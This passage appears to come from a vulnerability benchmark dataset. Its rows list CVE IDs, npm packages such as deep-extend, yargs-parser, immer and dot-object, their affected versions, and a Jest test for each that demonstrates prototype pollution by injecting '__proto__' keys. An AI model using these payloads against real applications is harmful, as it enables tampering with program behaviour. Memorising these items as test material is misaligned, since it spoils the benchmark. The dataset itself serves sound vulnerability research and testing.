  let result = deepExtends({ security: [{ 1: ""o"" }] }, payload);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/TypedProject/tsed/commit/1395773ddac35926cf058fc6da9fb8e82266761b,core/src/utils/deepExtends.ts:36:15,https://security.snyk.io/vuln/SNYK-JS-TSEDCORE-1019382; https://github.com/advisories/GHSA-77xq-cpvg-7xm2
prototype-pollution,CVE-2018-3750,deep-extend,0.5.0,0.5.1,prototype-pollution/deep-extend_0.5.0,"test(""prototype pollution in merge-objects"", () => {
  const merge = require(""deep-extend"");
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  obj = {};

  expect({}.polluted).toBe(undefined);

  merge({}, JSON.parse(malicious_payload));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/unclechu/node-deep-extend/commit/433ee51ed606f4e1867ece57b6ff5a47bebb492f,lib/deep-extend.js:117:17,https://security.snyk.io/vuln/npm:deep-extend:20180409; https://github.com/advisories/GHSA-hr2v-3952-633q
prototype-pollution,CVE-2018-3749,deap,1.0.0,1.0.1,prototype-pollution/deap_1.0.0,"//https://snyk.io/vuln/npm:deap:20180415
test(""prototype pollution in deap"", () => {
  const deap = require(""deap"");
  obj = {};
  let malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  deap.merge({}, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",,lib/connie-lang.js:35:28,https://security.snyk.io/vuln/npm:deap:20180415; https://github.com/advisories/GHSA-xrmp-99wj-p6jc
prototype-pollution,CVE-2020-28448,multi-ini,2.1.0,2.1.1,prototype-pollution/multi-ini_2.1.0,"//https://snyk.io/vuln/SNYK-JS-MULTIINI-1048969
test(""prototype pollution in multi-ini"", () => {
  const ini = require(""multi-ini"");
  const path = require(""path"");

  expect({}.polluted).toBe(undefined);

  ini.read(path.resolve(__dirname, ""./payload.toml""), { encoding: ""utf8"" });
  expect({}.polluted).toBe(""yes"");
});
",,lib/parser.js:193:38,https://security.snyk.io/vuln/SNYK-JS-MULTIINI-1048969; https://github.com/advisories/GHSA-g78f-549w-c354
prototype-pollution,CVE-2021-23421,merge-change,1.0.1,,prototype-pollution/merge-change_1.0.1,"//
test(""prototype pollution in merge-change"", () => {
  const utils = require(""merge-change"").utils;

  expect({}.polluted).toBe(undefined);

  let obj = {};
  utils.set(obj, [""__proto__"", ""polluted""], ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",,utils.js:63:26,https://github.com/VladimirShestakov/merge-change/blob/9901f145e06158f284f52de42e6ba5b0f702fb65/utils.js#L89-L123; https://security.snyk.io/vuln/SNYK-JS-MERGECHANGE-1310985
prototype-pollution,CVE-2020-7600,querymen,2.1.3,2.1.4,prototype-pollution/querymen_2.1.3,"//https://snyk.io/vuln/SNYK-JS-QUERYMEN-559867
test(""prototype pollution in querymen"", () => {
  var a = require(""querymen"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  a.handler(""__proto__"", ""polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/diegohaz/querymen/commit/1987fefcb3b7508253a29502a008d5063a873cef,dist/index.js:46:26,https://security.snyk.io/vuln/SNYK-JS-QUERYMEN-559867; https://github.com/advisories/GHSA-2cf2-2383-h4jv
prototype-pollution,CVE-2020-7608,yargs-parser,6.0.0,18.1.1,prototype-pollution/yargs-parser_6.0.0,"//https://snyk.io/vuln/SNYK-JS-YARGSPARSER-560381

test(""prototype pollution in yargs-parser"", () => {
  expect({}.polluted).toBe(undefined);

  const parser = require(""yargs-parser"");

  parser(""--foo.__proto__.polluted yes"");

  expect({}.polluted).toBe(""yes"");
});
",,index.js:587:14,https://security.snyk.io/vuln/SNYK-JS-YARGSPARSER-560381; https://github.com/advisories/GHSA-p9pc-299p-vxgp
prototype-pollution,CVE-2021-23436,immer,8.0.0,9.0.6,prototype-pollution/immer_8.0.0,"//https://snyk.io/vuln/SNYK-JS-IMMER-1019369
test(""prototype pollution in immer"", () => {
  expect({}.polluted).toBe(undefined);

  const { applyPatches, enablePatches } = require(""immer"");
  enablePatches();
  applyPatches({}, [
    { op: ""add"", path: [""__proto__"", ""polluted""], value: ""yes"" },
  ]);

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/immerjs/immer/commit/fa671e55ee9bd42ae08cc239102b665a23958237,src/plugins/patches.ts:245:16,https://security.snyk.io/vuln/SNYK-JS-IMMER-1540542; https://github.com/advisories/GHSA-33f9-j839-rf8h
prototype-pollution,CVE-2019-10793,dot-object,2.1.2,2.1.3,prototype-pollution/dot-object_2.1.2,"//https://snyk.io/vuln/SNYK-JS-DOTOBJECT-548905
test(""prototype pollution in dot-object "", () => {
  var a = require(""dot-object"");
  var obj = {};
  var path = ""__proto__"";

  expect({}.polluted).toBe(undefined);

  var val = { polluted: ""yes"" };
  a.set(path, val, {}, true);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/rhalff/dot-object/commit/f76cff5fe6d01d30ce110d8f454db2e5bd28a7de,index.js:415:25,https://security.snyk.io/vuln/SNYK-JS-DOTOBJECT-548905; 
prototype-pollution,CVE-2020-7717,dot-notes,3.2.0,,prototype-pollution/dot-notes_3.2.0,"//https://snyk.io/vuln/SNYK-JS-DOTNOTES-598668
test(""prototype pollution in dot-notes"", () => {
  expect({}.polluted).toBe(undefined);

  const dots = require(""dot-notes"");
  dots.create({}, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",,lib/create.js:43:19,https://security.snyk.io/vuln/SNYK-JS-DOTNOTES-598668; https://github.com/advisories/GHSA-qr4m-jcvc-3382
prototype-pollution,CVE-2020-7726,safe-object2,1.0.3,,prototype-pollution/safe-object2_1.0.3,"//https://snyk.io/vuln/SNYK-JS-SAFEOBJECT2-598801
test(""prototype pollution in safe-object2"", () => {
  const safeObj2 = require(""safe-object2"");
  const obj = safeObj2({});

  expect({}.polluted).toBe(undefined);

  obj.setter([""__proto__"", ""polluted""], ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",,lib/index.js:1:1869,https://security.snyk.io/vuln/SNYK-JS-SAFEOBJECT2-598801; https://github.com/advisories/GHSA-jpq3-xf27-5jf2
prototype-pollution,CVE-2020-7703,nis-utils,0.6.10,,prototype-pollution/nis-utils_0.6.10,"//https://snyk.io/vuln/SNYK-JS-NISUTILS-598799

test(""prototype pollution in nis-utils"", () => {
  const nisUtils = require(""nis-utils"");

  const object1 = {};
  expect({}.polluted).toBe(undefined);

  nisUtils.object.setValue({}, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",,lib/object.js:166:40,https://security.snyk.io/vuln/SNYK-JS-NISUTILS-598799; https://github.com/advisories/GHSA-gr58-j5wh-m333
prototype-pollution,CVE-2020-7723,promisehelpers,0.0.5,,prototype-pollution/promisehelpers_0.0.5,"//https://snyk.io/vuln/SNYK-JS-PROMISEHELPERS-598686
test(""prototype pollution in promisehelpers"", () => {
  const promisehelpers = require(""promisehelpers"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  promisehelpers.insert([""__proto__"", ""polluted""], ""yes"")(obj);
  expect({}.polluted).toBe(""yes"");
});
",,src/index.js:16:25,https://security.snyk.io/vuln/SNYK-JS-PROMISEHELPERS-598686; https://github.com/advisories/GHSA-rj5f-7c8x-gjg4
prototype-pollution,CVE-2018-3723,defaults-deep,0.2.0,0.2.4,prototype-pollution/defaults-deep_0.2.0,"//https://hackerone.com/reports/310514
test(""prototype pollution in defaults-deep "", () => {
  const defaultsDeep = require(""defaults-deep"");
  expect({}.polluted).toBe(undefined);

  let malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  defaultsDeep({}, JSON.parse(malicious_payload));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jonschlinkert/defaults-deep/commit/c873f341327ad885ff4d0f23b3d3bca31b0343e5,index.js:20:16,https://hackerone.com/reports/310514; https://security.snyk.io/vuln/npm:defaults-deep:20180215; https://github.com/advisories/GHSA-cqp5-m4pq-gfgp
prototype-pollution,CVE-2020-7716,deeps,1.4.5,,prototype-pollution/deeps_1.4.5,"//https://snyk.io/vuln/SNYK-JS-DEEPS-598667
test(""prototype pollution in deeps"", () => {
  expect({}.polluted).toBe(undefined);

  const deeps = require(""deeps"");
  deeps.set({}, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",,index.js:226:94,https://security.snyk.io/vuln/SNYK-JS-DEEPS-598667; https://github.com/advisories/GHSA-rgfv-v3jh-7ffp
prototype-pollution,CVE-2020-7618,sds,3.2.0,4.0.0,prototype-pollution/sds_3.2.0,"//https://snyk.io/vuln/SNYK-JS-SDS-564123
test(""prototype pollution in sds"", () => {
  const root = require(""sds"");

  obj = {};
  let payload = ""__proto__.polluted"";

  expect({}.polluted).toBe(undefined);

  root.set({}, payload, true);

  expect({}.polluted).toBe(true);
});
",https://github.com/monsterkodi/sds/commit/a228f025fd1be033088b7abbc0f77118d573f216,js:34:13,https://security.snyk.io/vuln/SNYK-JS-SDS-564123; https://github.com/advisories/GHSA-cxm3-284p-qc4v
prototype-pollution,CVE-2020-7706,connie,0.1.0,0.1.1,prototype-pollution/connie_0.1.0,"test(""prototype pollution in connie"", () => {
  expect({}.polluted).toBe(undefined);

  const connie = require(""connie"");
  const fs = require(""fs"");
  const path = require(""path"");
  const pathToConfig = path.resolve(__dirname, ""./config.json"");

  fs.writeFileSync(pathToConfig, `{""__proto__"": {""polluted"": ""yes""}}`);
  connie(""file"", pathToConfig)
    .read()
    .then(() => {
      expect({}.polluted).toBe(""yes"");
      fs.unlinkSync(pathToConfig);
    });
});
",https://github.com/mattinsler/connie-lang/commit/ef376d404c712dd28309ba07f28a8f87f24a015a,lib/connie-lang.js:43:28,https://security.snyk.io/vuln/SNYK-JS-CONNIELANG-598853; https://github.com/advisories/GHSA-8vv3-jxm8-f4vf
